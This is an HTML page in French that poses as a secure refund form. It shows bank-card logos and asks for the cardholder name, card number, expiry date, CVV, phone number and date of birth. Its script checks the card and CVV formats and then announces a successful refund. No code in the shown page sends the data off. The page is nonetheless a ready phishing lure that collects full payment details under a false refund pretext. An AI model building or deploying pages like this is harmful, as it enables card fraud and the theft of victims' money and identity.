<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire de Remboursement</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            font-family: 'Arial', sans-serif;
        }
    </style>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">

    <!-- Formulaire principal -->
    <div class="bg-white rounded-lg shadow-xl p-8 max-w-lg w-full">
        <!-- Logo -->
        <div class="flex justify-center mb-4">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/59/Euro_symbol_blue.svg" alt="Logo Euro"
                class="w-16 h-16">
        </div>

        <!-- Titre -->
        <h1 class="text-2xl font-bold text-center text-gray-800 mb-2">Formulaire de Remboursement</h1>
        <p class="text-sm text-center text-gray-600 mb-6">
            Veuillez entrer les informations de votre carte bancaire pour recevoir votre remboursement en toute sécurité.
            Ce processus est sécurisé et protégé.
        </p>

        <!-- Formulaire -->
        <form id="remboursement-form" onsubmit="return validateForm(event)">
            <!-- Nom complet -->
            <div class="mb-4">
                <label for="nom" class="block text-sm font-medium text-gray-700">Titulaire de la carte</label>
                <input type="text" id="nom" placeholder="Ex: Jean Dupont" required
                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
            </div>

            <!-- Numéro de carte -->
            <div class="mb-4">
                <label for="numero-carte" class="block text-sm font-medium text-gray-700">Numéro de carte</label>
                <input type="text" id="numero-carte" placeholder="1234 5678 9012 3456" required maxlength="19"
                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
            </div>

            <!-- Date d'expiration -->
            <div class="mb-4">
                <label for="date-expiration" class="block text-sm font-medium text-gray-700">Date d'expiration (MM/AA)</label>
                <input type="month" id="date-expiration" required
                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
            </div>

            <!-- Code CVV -->
            <div class="mb-4">
                <label for="cvv" class="block text-sm font-medium text-gray-700">Code CVV</label>
                <input type="text" id="cvv" placeholder="123" required maxlength="3"
                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
            </div>

            <!-- Numéro de téléphone -->
            <div class="mb-4">
                <label for="telephone" class="block text-sm font-medium text-gray-700">Numéro de téléphone</label>
                <input type="tel" id="telephone" placeholder="Ex: 06 12 34 56 78" required
                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
            </div>

            <!-- Date de naissance -->
            <div class="mb-6">
                <label for="naissance" class="block text-sm font-medium text-gray-700">Date de naissance (JJ/MM/AAAA)</label>
                <input type="date" id="naissance" required
                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
            </div>

            <!-- Bouton de validation -->
            <button type="submit"
                class="w-full bg-green-600 text-white font-bold py-2 px-4 rounded-lg hover:bg-green-700 transition duration-300">
                Valider mon remboursement
            </button>
        </form>

        <!-- Icônes des cartes -->
        <div class="mt-6 flex justify-center space-x-4">
            <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa" class="h-8">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="MasterCard"
                class="h-8">
            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal" class="h-8">
            <img src="https://upload.wikimedia.org/wikipedia/commons/3/39/CB_logo.svg" alt="CB" class="h-8">
        </div>
    </div>

    <!-- Script pour التحقق من البيانات -->
    <script>
        function validateForm(event) {
            event.preventDefault();

            const nom = document.getElementById('nom').value.trim();
            const numeroCarte = document.getElementById('numero-carte').value.replace(/\s+/g, '');
            const cvv = document.getElementById('cvv').value.trim();

            if (!/^\d{16}$/.test(numeroCarte)) {
                alert("❌ Numéro de carte invalide. Veuillez saisir 16 chiffres.");
                return false;
            }
            if (!/^\d{3}$/.test(cvv)) {
                alert("❌ Le code CVV doit contenir exactement 3 chiffres.");
                return false;
            }

            alert("✅ Votre remboursement a été validé avec succès !");
        }
    </script>
</body>
</html>
